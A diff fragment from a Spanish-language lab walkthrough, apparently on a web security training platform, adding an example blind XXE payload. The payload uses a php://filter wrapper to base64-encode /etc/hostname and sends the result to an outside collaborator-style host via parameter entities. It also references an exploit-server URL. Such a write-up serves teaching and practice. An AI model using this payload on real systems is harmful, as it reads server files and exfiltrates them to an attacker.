@@ -85,6 +85,15 @@ Lo que podemos hacer ahora que hemos confirmado que podemos `cargar` un `recurso
 %exfil;
 ```
 
+En este laboratorio no funciona, pero podríamos usar este `wrapper` de `php` para `encodear` el `output` del `comando` en `base64` si es más de una línea
+
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m?content=%file;'>">
+%eval;
+%exfil;
+```
+
 Lo siguiente que debemos hacer es irnos a donde pone `Craft response`, copiar la url `https://exploit-0aa200cb045beea1d8e97fad01f20055.exploit-server.net/exploit` y `enviar` la `petición`
 
 ```
